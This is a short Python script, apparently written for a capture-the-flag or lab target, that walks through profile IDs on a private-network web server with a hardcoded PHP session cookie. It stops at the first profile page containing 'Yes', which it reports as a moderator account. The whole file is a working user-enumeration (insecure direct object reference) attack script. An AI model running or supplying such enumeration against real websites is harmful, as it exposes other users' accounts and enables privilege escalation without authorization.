from requests import get
i = 0
lookup = True
while lookup:
    url = "http://10.100.1.202:8000/profile.php?id="+str(i)
    res = get(url, cookies={"PHPSESSID": "6d8kmuf7nkopm1s6qil0p8fe4t"})
    if("Yes" in res.text):
        print("[>] Found mod:",url)
        lookup=False
    i+=1